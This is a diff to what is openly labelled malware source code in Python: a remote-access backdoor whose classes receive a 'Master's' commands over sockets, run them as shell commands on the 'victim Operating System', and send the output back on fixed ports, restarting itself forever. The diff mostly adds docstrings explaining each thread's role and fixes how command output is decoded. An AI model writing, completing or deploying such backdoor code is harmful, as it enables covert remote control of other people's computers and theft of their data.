@@ -19,6 +19,9 @@ private_key = None
 
 
 class Commands:
+    """
+    This module gets info from the victim Operating System
+    """
     def ip():
         if platform.system() == 'Windows':
             return subprocess.check_output('ipconfig /all', shell=True).decode('cp850')
@@ -36,6 +39,10 @@ class Commands:
 
 
 class InThread(threading.Thread):
+    """
+    This Thread receives and executes the Master's commands
+    Invoked by the Malware Thread
+    """
     IN_PORT = 44455
     OUT_PORT = 44444
 
@@ -84,7 +91,7 @@ class InThread(threading.Thread):
                             if platform.system() == 'Windows':
                                 cons.send(resp.decode('cp850'))
                             else:
-                                cons.send(resp)
+                                cons.send(resp.decode('UTF-8'))
                         except subprocess.CalledProcessError:
                             cons.send("Impossible d'exécuter cette commande")
             elif msg[:4] == 'info':
@@ -128,6 +135,10 @@ class InThread(threading.Thread):
 
 
 class OutThread(threading.Thread):
+    """
+    This Thread sends the answers to the commands received in InThread
+    Invoked by the InThread
+    """
     def __init__(self, ip, out_port):
         super().__init__()
         self.ip = ip
@@ -172,7 +183,10 @@ class OutThread(threading.Thread):
 
 
 class Malware(threading.Thread):
-
+    """
+    Main Thread : invokes the InThread and waits for it to close
+    Generates the public and private keys
+    """
     def __init__(self):
         super().__init__()
 
@@ -206,6 +220,9 @@ class Malware(threading.Thread):
 
 
 while True:
+    """
+    Program runs indefinitely. Malware is Invoked everytime it finishes the previous execution
+    """
     malw = Malware()
     time.sleep(2)
     malw.join()
